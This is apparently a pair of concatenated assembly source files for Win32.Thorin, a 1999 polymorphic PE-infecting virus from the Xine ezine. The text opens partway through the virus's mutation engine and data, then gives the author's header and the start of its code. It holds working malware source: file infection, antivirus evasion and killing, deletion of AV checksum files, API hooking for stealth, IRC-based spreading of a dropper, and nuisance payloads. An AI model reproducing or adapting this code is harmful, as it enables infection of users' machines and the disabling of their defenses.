	call    THME_GIP_IncIt
	mov     bl,3
	call    THME_GIP_AddIt                  ; ADD E??,3
THME_GIP_@@2_EXIT:
	jmp     THME_GIP_EXIT

THME_GIP_@@3:
	mov     eax,2
	call    r_range
	xchg    eax,ecx
	jecxz   THME_GIP_@@3_@@2
THME_GIP_@@3_@@1:
	mov     bl,2                            ; ADD E??,2
	call    THME_GIP_AddIt
	mov     bl,2                            ; INC E??
	call    THME_GIP_IncIt                  ; INC E??
	jmp     THME_GIP_@@2_EXIT
THME_GIP_@@3_@@2:
	mov     bl,2                            ; INC E??
	call    THME_GIP_IncIt                  ; INC E??
	mov     bl,2                            ; ADD E??,2
	call    THME_GIP_AddIt
	jmp     THME_GIP_@@2_EXIT

THME_GIP_@@4:
	mov     eax,2
	call    r_range
	xchg    eax,ecx
	jecxz   THME_GIP_@@4_@@2
THME_GIP_@@4_@@1:
	mov     bl,1                            ; ADD E??,1
	call    THME_GIP_AddIt                  ; INC E??
	mov     bl,3                            ; INC E??
	call    THME_GIP_IncIt                  ; INC E??
	jmp     THME_GIP_@@2_EXIT
THME_GIP_@@4_@@2:
	mov     bl,1                            ; INC E??
	call    THME_GIP_IncIt                  ; INC E??
	mov     bl,3                            ; INC E??
	call    THME_GIP_AddIt                  ; ADD E??,1
	jmp     THME_GIP_@@2_EXIT

THME_GIP_@@5:                                   ; INC E??
	mov     bl,4                            ; INC E??
	call    THME_GIP_IncIt                  ; INC E??
						; INC E??

THME_GIP_EXIT:
	ret

THME_GIP_AddIt:
	mov     al,83h
	stosb
	mov     al,byte ptr [ebp+THME_PointerReg]
	or      al,11000000b
	stosb
	mov     al,bl
	stosb
	ret

THME_GIP_IncIt:
	movzx   ecx,bl
	mov     al,40h
	add     al,byte ptr [ebp+THME_PointerReg]
THME_GIP_II_Loop:
	stosb
	pushad
	call    THME_GenGarbage
	popad
	loop    THME_GIP_II_Loop
	ret

THME_GenDecCounter:
	mov     eax,3
	call    r_range
	xchg    eax,ecx
	jecxz   THME_GDC_@@2
	dec     ecx
	jecxz   THME_GDC_@@3
THME_GDC_@@1:                                   ; SUB E??,1
	mov     al,83h
	stosb
	mov     al,byte ptr [ebp+THME_CounterReg]
	or      al,11101000b
	stosb
	mov     al,1
	stosb
	jmp     THME_GDC_EXIT
THME_GDC_@@2:
	mov     al,48h                          ; DEC E??
	add     al,byte ptr [ebp+THME_CounterReg]
	stosb
	jmp     THME_GDC_EXIT
THME_GDC_@@3:
	mov     al,83h                          ; ADD E??,-1
	stosb
	mov     al,byte ptr [ebp+THME_CounterReg]
	or      al,11000000b
	stosb
	mov     al,0FFh
	stosb
THME_GDC_EXIT:
	ret

THME_GenLoop:
	mov     ax,850Fh                        ; JNZ FAR ????????
	stosw
	mov     eax,dword ptr [ebp+THME_LoopAddress]
	sub     eax,edi
	sub     eax,00000004h
	stosd
	ret

THME_OneByters  label   byte
	cld
	cmc
	clc
	stc
	dec     eax
	inc     eax
	lahf
	nop
	salc
sTHME_OneByters equ     ($-THME_OneByters)

THME_Copro      label   byte
	f2xm1
	fabs
	fadd
	faddp
	fchs
	fnclex
	fcom
	fcomp
	fcompp
	fcos
	fdecstp
	fdiv
	fdivp
	fdivr
	fdivrp
	ffree
	fincstp
	fld1
	fldl2t
	fldl2e
	fldpi
	fldln2
	fldz
	fmul
	fmulp
	fnclex
	fnop
	fpatan
	fprem
	fprem1
	fptan
	frndint
	fscale
	fsin
	fsincos
	fsqrt
	fst
	fstp
	fsub
	fsubp
	fsubr
	fsubrp
	ftst
	fucom
	fucomp
	fucompp
	fxam
	fxtract
	fyl2x
	fyl2xp1
sTHME_Copro     equ     (($-THME_Copro)/2)

; Possibilities before crypt operation

THME_Decrypt1   label   byte
	dd      offset (THME_Decrypt1a)
	dd      offset (THME_Decrypt1b)
	dd      offset (THME_Decrypt1c)
sTHME_Decrypt1  equ     (($-THME_Decrypt1)/4)

THME_Decrypt1a  label   byte
	dd      offset (THME_GenDeltaOffset)
	dd      offset (THME_GenLoadSize)
	dd      offset (THME_GenLoadPointer)
sTHME_Decrypt1a equ     (($-THME_Decrypt1a)/4)

THME_Decrypt1b  label   byte
	dd      offset (THME_GenDeltaOffset)
	dd      offset (THME_GenLoadPointer)
	dd      offset (THME_GenLoadSize)
sTHME_Decrypt1b equ     (($-THME_Decrypt1b)/4)

THME_Decrypt1c  label   byte
	dd      offset (THME_GenLoadSize)
	dd      offset (THME_GenDeltaOffset)
	dd      offset (THME_GenLoadPointer)
sTHME_Decrypt1c equ     (($-THME_Decrypt1c)/4)

; Main table (for garbage generation)

THME_GBG_Table  label   byte
	dd      offset (THME_GBG_Arithmetic_EAX_IMM32)
	dd      offset (THME_GBG_Arithmetic_REG32_REG32)
	dd      offset (THME_GBG_Arithmetic_REG32_IMM32)
	dd      offset (THME_GBG_MOV_REG16_REG16)
	dd      offset (THME_GBG_MOV_REG16_IMM16)
	dd      offset (THME_GBG_MOV_REG32_REG32)
	dd      offset (THME_GBG_MOV_REG32_IMM32)
	dd      offset (THME_GBG_GenOneByter)
	dd      offset (THME_GBG_GenCopro)
	dd      offset (THME_GBG_GenPUSHPOP)
	dd      offset (THME_GBG_GenCALL_Type1)
sTHME_GBG_Table equ     (($-THME_GBG_Table)/4)

thme_end        label   byte

THME            endp

; ===========================================================================
; Random procedures 
; ===========================================================================
;
; RANDOM
;
; input:
;       Nothing.
; output:
;       EAX = Random number
;

random          proc                            ; Thanx MDriller! ;)
	push    ecx
	mov     eax,dword ptr [ebp+rnd_seed1]
	dec     dword ptr [ebp+rnd_seed1]
	xor     eax,dword ptr [ebp+rnd_seed2]
	mov     ecx,eax
	rol     dword ptr [ebp+rnd_seed1],cl
	add     dword ptr [ebp+rnd_seed2],eax
	adc     eax,dword ptr [ebp+rnd_seed2]
	add     eax,ecx
	ror     eax,cl
	not     eax
	sub     eax,3
	xor     dword ptr [ebp+rnd_seed2],eax
	xor     eax,dword ptr [ebp+rnd_seed3]
	rol     dword ptr [ebp+rnd_seed3],1
	sub     dword ptr [ebp+rnd_seed3],ecx
	sbb     dword ptr [ebp+rnd_seed3],4
	inc     dword ptr [ebp+rnd_seed2]
	pop     ecx
	ret
random          endp

; R_RANGE
;
; input:
;       EAX = Number of possible random numbers
; output:
;       EAX = Number between 0 and (EAX-1)

r_range         proc
	push    ecx
	push    edx
	mov     ecx,eax
	call    random
	xor     edx,edx
	div     ecx
	mov     eax,edx
	pop     edx
	pop     ecx
	ret
r_range         endp

; ===========================================================================
; Virus data
; ===========================================================================
; I went to god just to see, and i was looking at me.

_MASK           db      "*."
EXTENSION       dd      00000000h

EXTENSIONS      db      "EXE",0                 ; Nice table: very easy to 
		db      "SCR",0                 ; add new extensions to infect
		db      "CPL",0
n_EXT           equ     (($-offset EXTENSIONS)/4)

ALL_MASK        db      "*.*",0

dotdot          db      "..",0
root            db      "c:\",0                 ; Don't be afraid... :)

key_mIRC        db      "iKX\Thorin\mIRC32",0
key_PIRCH       db      "iKX\Thorin\Pirch32",0
key_ViRC97      db      "iKX\Thorin\ViRC97",0

; Whoaaaaa... many many many payloads! 

payload_table   label   byte
		dd      offset (payload1)
		dd      offset (payload2)
		dd      offset (payload3)
		dd      offset (payload4)
		dd      offset (payload5)
payload_number  equ     (($-offset payload_table)/4)

infections      dd      00000000h
imagebase       dd      imagebase_
kernel          dd      kernel_

K32_DLL         db      "KERNEL32.dll",0
K32_Size        equ     $-K32_DLL

szSHELL32       db      "SHELL32",0
szUSER32        db      "USER32",0
szADVAPI32      db      "ADVAPI32",0

szOPEN          db      "OPEN",0
szMicro$oft     db      "http://www.microsoft.com",0    ; Yaaaaaaargh!!!

; @@BadProgramz structure
; ???????????????????????
;       +02h    String Size
;       +??h    First letters (string size) of files we don't want to be infected

@@BadProgramz           label   byte
			db      02h,"TB"        ; ThunderByte?
			db      02h,"F-"        ; F-Prot?
			db      03h,"NAV"       ; Norton Antivirus?
			db      03h,"AVP"       ; AVP?
			db      03h,"WEB"       ; DrWeb?
			db      03h,"PAV"       ; Panda?
			db      03h,"DRW"       ; DrWeb?
			db      04h,"DSAV"      ; Dr Solomon?
			db      03h,"NOD"       ; Nod-Ice?
			db      06h,"WINICE"    ; SoftIce?
			db      06h,"FORMAT"    ; Format?
			db      05h,"FDISK"     ; Fdisk?
			db      08h,"SCANDSKW"  ; ScanDisk?
			db      06h,"DEFRAG"    ; Defrag?
			db      0BBh

@@BadPhilez             label   byte            ; Files to delete in all dirz
ANTIVIR_DAT             db      "ANTI-VIR.DAT",0
CHKLIST_DAT             db      "CHKLIST.DAT",0
CHKLIST_TAV             db      "CHKLIST.TAV",0
CHKLIST_MS              db      "CHKLIST.MS",0
CHKLIST_CPS             db      "CHKLIST.CPS",0
AVP_CRC                 db      "AVP.CRC",0
IVB_NTZ                 db      "IVB.NTZ",0
SMARTCHK_MS             db      "SMARTCHK.MS",0
SMARTCHK_CPS            db      "SMARTCHK.CPS",0

Monitors2Kill           label   byte
			db      "AVP Monitor",0
			db      "Amon Antivirus Monitor",0
			db      0BBh


; @@Hookz structure
; ?????????????????
;       +00h    API Name
;       +??h    Bytes from beginning of virus until beginning of hook handler

@@Hookz                 label   byte
?szMoveFileA            db      "MoveFileA",0
?hnMoveFileA            dd      (offset HookMoveFileA)

?szCopyFileA            db      "CopyFileA",0
?hnCopyFileA            dd      (offset HookCopyFileA)

?szGetFullPathNameA     db      "GetFullPathNameA",0
?hnGetFullPathNameA     dd      (offset HookGetFullPathNameA)

?szDeleteFileA          db      "DeleteFileA",0
?hnDeleteFileA          dd      (offset HookDeleteFileA)

?szWinExec              db      "WinExec",0
?hnWinExec              dd      (offset HookWinExec)

?szCreateProcessA       db      "CreateProcessA",0
?hnCreateProcessA       dd      (offset HookCreateProcessA)

?szCreateFileA          db      "CreateFileA",0
?hnCreateFileA          dd      (offset HookCreateFileA)

?szGetFileAttributesA   db      "GetFileAttributesA",0
?hnGetFileAttributesA   dd      (offset HookGetFileAttributesA)

?szFindFirstFileA       db      "FindFirstFileA",0
?hnFindFirstFileA       dd      (offset HookFindFirstFileA)

?szFindNextFileA        db      "FindNextFileA",0
?hnFindNextFileA        dd      (offset HookFindNextFileA)

?szHookGetProcAddress   db      "GetProcAddress",0
?hnHookGetProcAddress   dd      (offset HookGetProcAddress)

			db      ""             ; How funny ;)

@IsDebuggerPresent      db      "IsDebuggerPresent",0

; Hrm, i think i should write some compression engine for that API shit :)

@@Namez                 label   byte
@GetModuleHandleA       db      "GetModuleHandleA",0
@LoadLibraryA           db      "LoadLibraryA",0
@FindClose              db      "FindClose",0
@SetFilePointer         db      "SetFilePointer",0
@SetFileAttributesA     db      "SetFileAttributesA",0
@CloseHandle            db      "CloseHandle",0
@GetCurrentDirectoryA   db      "GetCurrentDirectoryA",0
@SetCurrentDirectoryA   db      "SetCurrentDirectoryA",0
@GetWindowsDirectoryA   db      "GetWindowsDirectoryA",0
@GetSystemDirectoryA    db      "GetSystemDirectoryA",0
@CreateFileMappingA     db      "CreateFileMappingA",0
@MapViewOfFile          db      "MapViewOfFile",0
@UnmapViewOfFile        db      "UnmapViewOfFile",0
@SetEndOfFile           db      "SetEndOfFile",0
@WriteFile              db      "WriteFile",0
@GetTickCount           db      "GetTickCount",0
@GetVersion             db      "GetVersion",0
@GlobalAlloc            db      "GlobalAlloc",0
@GlobalFree             db      "GlobalFree",0
@GetFileSize            db      "GetFileSize",0
@SetVolumeLabelA        db      "SetVolumeLabelA",0
@GetSystemTime          db      "GetSystemTime",0

@@HookedNamez           label   byte
@MoveFileA              db      "MoveFileA",0
@CopyFileA              db      "CopyFileA",0
@GetFullPathNameA       db      "GetFullPathNameA",0
@DeleteFileA            db      "DeleteFileA",0
@WinExec                db      "WinExec",0
@CreateProcessA         db      "CreateProcessA",0
@CreateFileA            db      "CreateFileA",0
@GetFileAttributesA     db      "GetFileAttributesA",0
@FindFirstFileA         db      "FindFirstFileA",0
@FindNextFileA          db      "FindNextFileA",0
@GetProcAddress         db      "GetProcAddress",0
			db      0BBh            ; I rule! :)

@@USER32_APIs           label   byte
@SwapMouseButton        db      "SwapMouseButton",0
@MessageBoxA            db      "MessageBoxA",0
@FindWindowA            db      "FindWindowA",0
@PostMessageA           db      "PostMessageA",0
			db      ""             ; I like girls...

@@ADVAPI32_APIs         label   byte
@RegCreateKeyExA        db      "RegCreateKeyExA",0
@RegOpenKeyExA          db      "RegOpenKeyExA",0
@RegDeleteKeyA          db      "RegDeleteKeyA",0
			db      ""             ; And music tho :)

@@SHELL32_APIs          label   byte
@ShellExecuteA          db      "ShellExecuteA",0

random_seed     label   byte
rnd_seed1       dd      00000000h
rnd_seed2       dd      00000000h
rnd_seed3       dd      00000000h
		dd      00000000h

; THME Poly Engine data

THME_CounterReg db      00h
THME_PointerReg db      00h
THME_DeltaReg   db      00h

THME_CoproInit  db      00h
THME_CryptOp    db      00h

THME_Recursion  db      00h
THME_LoopAddress db     00000000h
THME_CryptKey   dd      00000000h
THME_Pointer    dd      00000000h
THME_Data2crypt dd      00000000h
THME_Size2crypt dd      00000000h
THME_S2C_div4   dd      00000000h
THME_GDO_TmpCll dd      00000000h
THME_Fix1       dd      00000000h
THME_Key1       dd      00000000h               ; ADD/SUB/XOR key

; Virus data

NewSize         dd      00000000h
SearchHandle    dd      00000000h
FileHandle      dd      00000000h
MapHandle       dd      00000000h
MapAddress      dd      00000000h
AddressTableVA  dd      00000000h
NameTableVA     dd      00000000h
OrdinalTableVA  dd      00000000h
TempGA_IT1      dd      00000000h
TempGA_IT2      dd      00000000h
TempHandle      dd      00000000h
iobytes         dd      00000000h,00000000h,00000000h,00000000h,00000000h
GlobalAllocHnd  dd      00000000h
GlobalAllocHnd_ dd      00000000h
TSHandle        dd      00000000h
RegHandle       dd      00000000h
Disposition     dd      00000000h
lpFilePart      dd      00000000h
WFD_HndInMem    dd      00000000h
WFD_Handles_Count db    00h
CoolFlag        db      00h
inNT            db      00h
CurrentExt      db      00h

tempcurdir      db      7Fh dup (00h)

@@Offsetz               label   byte
_GetModuleHandleA       dd      00000000h
_LoadLibraryA           dd      00000000h
_FindClose              dd      00000000h
_SetFilePointer         dd      00000000h
_SetFileAttributesA     dd      00000000h
_CloseHandle            dd      00000000h
_GetCurrentDirectoryA   dd      00000000h
_SetCurrentDirectoryA   dd      00000000h
_GetWindowsDirectoryA   dd      00000000h
_GetSystemDirectoryA    dd      00000000h
_CreateFileMappingA     dd      00000000h
_MapViewOfFile          dd      00000000h
_UnmapViewOfFile        dd      00000000h
_SetEndOfFile           dd      00000000h
_WriteFile              dd      00000000h
_GetTickCount           dd      00000000h
_GetVersion             dd      00000000h
_GlobalAlloc            dd      00000000h
_GlobalFree             dd      00000000h
_GetFileSize            dd      00000000h
_SetVolumeLabelA        dd      00000000h
_GetSystemTime          dd      00000000h
@@HookedOffsetz         label   byte
_MoveFileA              dd      00000000h
_CopyFileA              dd      00000000h
_GetFullPathNameA       dd      00000000h
_DeleteFileA            dd      00000000h
_WinExec                dd      00000000h
_CreateProcessA         dd      00000000h
_CreateFileA            dd      00000000h
_GetFileAttributesA     dd      00000000h
_FindFirstFileA         dd      00000000h
_FindNextFileA          dd      00000000h
_GetProcAddress         dd      00000000h
n_HookedAPIs            equ     (($-@@HookedOffsetz)/4)


@@USER32_Addresses      label   byte
_SwapMouseButton        dd      00000000h
_MessageBoxA            dd      00000000h
_FindWindowA            dd      00000000h
_PostMessageA           dd      00000000h

@@ADVAPI32_Addresses    label   byte
_RegCreateKeyExA        dd      00000000h
_RegOpenKeyExA          dd      00000000h
_RegDeleteKeyA          dd      00000000h

MAX_PATH                equ     260

FILETIME                STRUC
FT_dwLowDateTime        dd      ?
FT_dwHighDateTime       dd      ?
FILETIME                ENDS

WIN32_FIND_DATA  label  byte
WFD_dwFileAttributes    dd      ?
WFD_ftCreationTime      FILETIME ?
WFD_ftLastAccessTime    FILETIME ?
WFD_ftLastWriteTime     FILETIME ?
WFD_nFileSizeHigh       dd      ?
WFD_nFileSizeLow        dd      ?
WFD_dwReserved0         dd      ?
WFD_dwReserved1         dd      ?
WFD_szFileName          db      MAX_PATH dup (?)
WFD_szAlternateFileName db      13 dup (?)
			db      03 dup (?)

_WIN32_FIND_DATA label  byte
_WFD_dwFileAttributes   dd      ?
_WFD_ftCreationTime     FILETIME ?
_WFD_ftLastAccessTime   FILETIME ?
_WFD_ftLastWriteTime    FILETIME ?
_WFD_nFileSizeHigh      dd      ?
_WFD_nFileSizeLow       dd      ?
_WFD_dwReserved0        dd      ?
_WFD_dwReserved1        dd      ?
_WFD_szFileName         db      MAX_PATH dup (?)
_WFD_szAlternateFileName db     13 dup (?)
			db      03 dup (?)

SYSTEMTIME              label   byte
ST_wYear                dw      ?
ST_wMonth               dw      ?
ST_wDayOfWeek           dw      ?
ST_wDay                 dw      ?
ST_wHour                dw      ?
ST_wMinute              dw      ?
ST_wSecond              dw      ?
ST_wMilliseconds        dw      ?


directories             label   byte

WindowsDir              db      7Fh dup (00h)
SystemDir               db      7Fh dup (00h)
OriginDir               db      7Fh dup (00h)
dirs2inf                equ     (($-directories)/7Fh)
mirrormirror            db      dirs2inf

		align   dword

crypt_end       label   byte

virus_end       label   byte

; ===========================================================================
; First generation host
; ===========================================================================
; I'm alone. I'm with me. I'm thinking. I'm dangerous.

fakehost:
	pop     dword ptr fs:[0]
	pop     eax
	popad
	popfd

	xor     eax,eax
	push    eax
	push    offset szTitle
	push    offset szMessage
	push    eax
	call    MessageBoxA

	push    00000000h
	call    ExitProcess

end             thorin

; ===========================================================================
; Bonus Track                                                               
; ===========================================================================
;
; As this virus is related with Tolkien, there is also a relation with some
; songs of my favourite band: Blind Guardian. And as most of you don't know
; a shit about them, here i will put one song: The Bard's Song [in the fo-
; rest], that is the hymn of all Blind Guardian's fans. By the way, i have to
; wish them good luck, because i've heard that their vocalist had recently an
; operation in his ear. Good luck, Hansi!!! We will always love you!
;
; Bard's Song [in the forest]
; ???????????????????????????
; Now you all know
; The bards and their songs
; When hours have gone by
; I'll close my eyes
; In a world far away
; We may meet again
; But now hear my song
; About the dawn of the night
; Let's sing the bards' song
;
; Tomorrow will take us away
; Far from home
; Noone will ever know our names
; But the bards' song will remain
; Tomorrow will take it away
; The fear of today
; It will be gone
; Due to our magic songs
;
; There's only one song
; Left in my mind
; Tales of a brave man
; Who lived far from here
;
; Now the bard songs are over
; And it's time to leave
; Noone should ask you for the name
; Of the one
; Who tells the story
;
; Tomorrow will take us away
; Far from home
; Noone will ever know our names
; But the bards' song will remain
; Tomorrow all will be known
; And you are not alone
; So don't be afraid
; In the dark and cold
; 'Cause the bards' song will remain
; They all will remain
;
; In my thoughts and dreams
; They're always in my mind
; These songs from hobbits, dwarves and men
; And elves
; Come close your eyes
; You can see them, too
;
; ---
; Copyright (c) 1992 by Blind Guardian; "Somewhere far beyond" album.






 ; Brought to you by 'The ZOO' !


                                        /-----------------------------\
                                        | Xine - issue #4 - Phile 204 |
                                        \-----------------------------/

; [Win32.Thorin] - PE/mIRC/PIRCH/ViRC97/resident/semi-stealth/poly/RDA, etc.
; Copyright (c) 1999 by Billy Belcebu/iKX
;
; ??»    ??» ??» ???»   ??» ??????»  ??????»
; ???    ??? ??? ????»  ??? ???????» ???????»
; ??? ?» ??? ??? ?????» ???  ???????  ???????
; ??????»??? ??? ??????»???  ??????» ???????
; ?????????? ??? ??? ?????? ???????? ???????» ??»
;  ????????  ??? ???  ????? ???????  ???????? ???
;                        ????????» ??»  ??»  ??????»  ??????»  ??» ???»   ??»
;                        ????????? ???  ??? ????????» ???????» ??? ????»  ???
;                           ???    ???????? ???   ??? ???????? ??? ?????» ???
;                           ???    ???????? ???   ??? ???????» ??? ??????»???
;                           ???    ???  ??? ????????? ???  ??? ??? ??? ??????
;                           ???    ???  ???  ???????  ???  ??? ??? ???  ?????
;
; Virus Name    : Thorin.11932 [ Bugfix version ]
; Virus Author  : Billy Belcebu/iKX
; Origin        : Spain
; Platform      : Win32
; Target        : PE files (EXE/SCR/CPL) & mIRC/PIRCH/ViRC97 spreading
; Poly          : THME 1.0 [The Hobbit Mutation Engine]
; Unpack        : LSCE 1.0 [Little Shitty Compression Engine]
; Compiling     : TASM 5.0 and TLINK 5.0 should be used
;                       tasm32 /ml /m3 thorin,,;
;                       tlink32 /Tpe /aa /c /v thorin,thorin,,import32.lib,
;                       pewrsec thorin.exe
; Why 'Thorin'? : Heh,  are  you an incult  guy? Heh, have  you ever read the
;                 wonderful book  of the  wonderful author  J. R. R. Tolkien,
;                 called "The Hobbit"? Ok, if  you did  it, you  can  realize
;                 that the most important  dwarf is called  in this way :) He
;                 died with honour, and he  couldn't taste the victory and be
;                 the king, anyway thanks to him, the Middle-Earth was a much
;                 better world for years. Ain't it charming? ;)
; Features      : Ok, here i will list all that this babe is able to do...
;                 ? Infect PE files in current, Windows, and System dirs.
;                 ? Runtime module, infects 4 files each time.
;                 ? Per-Process residency (Import Table & GetProcAddress).
;                 ? Infects EXE, SCR & CPL files.
;                 ? Anti-Debugging features (SEH & 'IsDebuggerPresent').
;                 ? Anti-Emulation features.
;                 ? Anti-Monitors, kills AVP Monitor and AMON.
;                 ? Polymorphic layer of decryption.
;                 ? RDA layer of decryption.
;                 ? Size Stealth (FindFirstFileA/FindNextFileA).
;                 ? Fast infection (depending of the host).
;                 ? Internet aware virus: mIRC, ViRC97 and PIRCH scripts.
;                 ? Traversal routine for search for the scripts (hi LJ!).
;                 ? Packed dropper, used LSCE 1.0.
;                 ? Really tiny unpacker.
;                 ? Multiple payloads (see below).
;                 ? Doesn't hardcode KERNEL32 base address.
;                 ? Doesn't hardcode API addresses (of course).
;                 ? Gets Image Base at running time.
;                 ? Removes many AV CRC files.
;                 ? Avoids infection of certain (dangerous for us) files.
; Payloads      : Yes, this virus has multiple payloads (hi DuST!). Let's see
;                 a little  overview  of them (executed every 26 of October).
;                 1. The biggest one, based  in a  trick  that i  learnt from
;                 mandragore's viruses, dropping  a file  as C:\WIN.COM, that
;                 gets executed by the system before  of the file that should
;                 be, that is C:\WINDOWS\WIN.COM, thus bringing us the possi-
;                 bility of own the computer before windows :) Well, it cons-
;                 ists in  a very  little, simple and  easy quiz that all ppl
;                 who had read "The Hobbit" once in his life would be able to
;                 pass without problems, and consists of 3 questions.
;                 2. Sets the HD's name as 'THORIN'.
;                 3. Due an idea  that my friend  Qozah gave me, it swaps the
;                 mouse buttons, thus  making the  user be  stoned... All you
;                 clicked with the left button, now you'll have to click with
;                 the right one, and vice-versa.
;                 4. The typical MessageBox with a silly message.
;                 5. Launches user  to Microsoft page, thus annoying  him and
;                 make his little and ignorant mind to think that the awaited
;                 Micro$oft offensive  over the  earth has began. Well, ain't
;                 this one charming? ;)
; Internet      : This  virus is  able  to  spread itself using the most used
;                 IRC  programs over  the  world: mIRC, PIRCH and ViRC. Every
;                 infected  system  will  have  a  little  infected  file  in
;                 C:\PR0N.EXE. This  file  is sent to everyone that joins the
;                 channel where the  user is chatting by DCC. Very simple and
;                 effective.
; Greetings     : This virus is dedicated  to many people... Firstly, to  the
;                 iKX crew for trust in me, to the DDT past,present and futu-
;                 re crew for the friendship during the time, 29A ppl, FS ppl
;                 etc. Now, the  personal greetings (w/ no particular order):
;
;                 SeptiC - Your 'Internet aware viruses' article rules!!!
;                 b0z0 - Hi, my favourite 'little' clown :)
;                 StarZer0 - no. no, no. no sex.
;                 Int13h - I'd like you come to Spain :)
;                 Murkry - I'm glad to be in a group with this genius.
;                 n0ph - I still don't have the pleasure of knowin' you...
;                 Somniun - Si tienes alguna duda de Win32, pregunta!! ;)
;                 Wintermute - RAMMSTEIN rules! You always have reason ;)
;                 Owl - You are very isolated from the world, pal :)
;                 Vecna - The best coder of everytime.
;                 Ypsilon - Nos vemos en septiembre! :)
;                 Bumblebee - Pues eso, a ver si tu vienes tambien...
;                 TechnoPhunk - Forget catholicism and be nihilist! ;)
;                 Qozah - I'd like to do a cooperation project with ya ;)
;                 Benny - Same with you :) Yer a reely impressive codah!
;                 Super - ?Como te va en Castellon?
;                 nIgr0 - Code viruses, not 'legal' thingies!
;                 MDriller - best p0lys without any kinda discussion...
;                 T-2000 - I share ur ideas 'bout religion: radical but true
;                 SlageHammer - I loved yer city! Milano rocks! Padania rocks!
;                 VirusBuster - I've seen "Love Struck Baby" video. SRV rlz ;)
;                 LordJulus - Keep on coding, but optimize more! ;)
;
;                 Also dedicated to all the Bards around!
;
; Thoughts      : This is, nowadays, my  best virus  so far, over Iced Earth,
;                 Garaipena, and Nitro, all of  them for Windoze. I needed to
;                 do at least  a good  virus, for feed my own ego (why lie?),
;                 and i think this is  what really happened. But i won't stop
;                 there, there are many  things yet to  explore (and exploit)
;                 in 32 bit  enviroments, there are  many problems  unsolved,
;                 and i  will try  to contribute  with my humble code for all
;                 those purposes. Btw, i used, in my other viruses, to try to
;                 optimize , but  in  this virus i didn't. I  mean, you won't
;                 see here OBVIOUS lacks of optimization, like CMP reg,-1 but
;                 i will use many times the same code in different procedures
;                 many  strings, two  droppers (one for IRC distribution, and
;                 other for one payload). This virus is big in its size, well
;                 not as  Win32.Harrier,  Win32.Libertine, WinNT.Remex, etc.,
;                 but it's a 'big' one, and  i hope  this  will mean a 'good'
;                 one. Fuck, i've coded also a  lot of payloads, none of them
;                 is destructive, but all are VERY annoying... The descripti-
;                 on is above, if you don't believe me.
;                 Well, now i'm  gonna excuse myself,  because  while  making
;                 this virus (based initially  on my Win95.Iced Earth) i have
;                 noticed the great quantity of bugs that my Iced Earth virus
;                 had (believe me, more  than 10  incredible bugs!),  and i'm
;                 still wondering why all those escaped from my beta testing.
;                 Moreover, all those bugs only reflect my incompetence. With
;                 this virus i  have made  very serious tests, mainly because
;                 some delicated parts of the virus needed it to work perfec-
;                 ly (i.e. per-process  residence). Maybe there  will be also
;                 bugs, but now at least i know there are less :)
;                 My next steps  will be  the  research  in the fields of MMX
;                 polymorphism, some  metamorphism, and i  hope  that my next
;                 virus will use EPO techniques, because i haven't experimen-
;                 ted yet with such a kewl thing.
; Politics      : Benny doesn't like that i use to talk about politics, but i
;                 have put it there  just for explain some  things that could
;                 guide you to  misunderstand my  way of act. Everybody knows
;                 that i tend to  Marxism, right? Well, but  i'm  not  saying
;                 with this that  i support  Fidel Castro, Mao, and such like
;                 pseudo-communists (that tend to totalitarism). I think that
;                 everybody must have  the same oportunities, and without any
;                 kind of discrimination. But as i  am not a guy with an only
;                 idea, i  support also (if there isn't any other choice) the
;                 democracy, but i prefer it to be  a democracy as participa-
;                 tion and not as a procediment. Whom has studied some philo-
;                 sophy will know of what  i am  talking about: avoid the fi-
;                 erce  and  discriminatory capitalism. As i am tolerant, you
;                 can be againist my  ideas, and i  will accept it. So Benny,
;                 i'm not a totalitarian asshole, just the opposite, i'm just
;                 a young idealist :) Be free, enjoy life...
; Final note    : Although it  screwed me  a lot, i  haven't put  data in the
;                 heap as i used to  do because this virus is too big and the
;                 data used temporally is also too big, and it generated some
;                 protection faults... SHIT!!!!
;
;                              That is not dead
;                           which can eternal lie
;                           yet with strange aeons
;                             even death may die
;
;                             -H. P. Lovecraft-
;
; (c) 1999 Billy Belcebu/iKX

		.586p
		.model  flat
		.data

; 1st gen exported apis

extrn           MessageBoxA:PROC
extrn           ExitProcess:PROC

; Some useful equates

virus_size      equ     (offset virus_end-offset virus_start)
poly_virus_size equ     (offset crypt_end-offset thorin)
shit_b4_delta   equ     (offset delta-offset virus_start)
encrypt_size    equ     (crypt_end-crypto)
non_crypt_size  equ     (virus_size-encrypt_size-rda_decryptor)
rda_decryptor   equ     (virus_end-crypt_end)
section_flags   equ     00000020h or 20000000h or 80000000h
directory_attr  equ     00000010h
temp_attributes equ     00000080h
drop_old_size   equ     00011000d
n_Handles       equ     50d
WFD_HndSize     equ     n_Handles*8

n_infections    equ     04h
bad_number      equ     09h

orig_size       equ     044h
mark            equ     04Ch
ddInfMark       equ     "NRHT"

kernel_         equ     0BFF70000h              ; Only used if the K32 search
kernel_wNT      equ     077F00000h              ; fails...

imagebase_      equ     000400000h              ; y0h0h0

; Interesting macros for my code

cmp_            macro   reg,joff1               ; Optimized version of
		inc     reg                     ; CMP reg,0FFFFFFFFh
		jz      joff1                   ; JZ  joff1
		dec     reg                     ; The code is reduced in 3
		endm                            ; bytes (7-4)

cmpz            macro   reg,joff2               ; Optimized version of
		xchg    reg,ecx                 ; CMP reg,00h
		jecxz   joff2                   ; JZ  joff2
		endm                            ; Code reduced in 2 bytes

cmpz_           macro   reg,joff3               ; Blah
		or      reg,reg
		jz      joff3
		endm

apicall         macro   apioff                  ; Optimize muthafucka!
		call    dword ptr [ebp+apioff]
		endm

rva2va          macro   reg,base                ; Only for make preetiest the
		add     reg,[ebp+base]          ; code ;)
		endm

virussize       macro
		db      virus_size/10000 mod 10 + "0"
		db      virus_size/01000 mod 10 + "0"
		db      virus_size/00100 mod 10 + "0"
		db      virus_size/00010 mod 10 + "0"
		db      virus_size/00001 mod 10 + "0"
		endm

; Some shitty thingies in data section... 1st gen host messages

		.data

szTitle         db      "[Win32.Thorin]",0
szMessage       db      "First Generation Sample",10
		db      "Virus Size : "
		virussize
		db      " bytes"
		db      10
		db      "Copyright (c) 1999 by Billy Belcebu/iKX",0

; El ke mucho llora es porke no mama!

	 .code

; ===========================================================================
; Virus code
; ===========================================================================
; DU HAST MICH!!!

virus_start     label   byte

poly_layer      db LIMIT dup (90h)              ; Space for poly-decryptor

thorin:
	pushad                                  ; Push all da shit
	pushfd

	fwait                                   ; Reset coprocessor
	fninit                                  

	call    kill_av                         ; Anti-emulation trick

	mov     esp,[esp+08h]
	xor     edx,edx
	pop     dword ptr fs:[edx]
	pop     edx
	jmp     over_trap

kill_av:
	xor     edx,edx
	push    dword ptr fs:[edx]
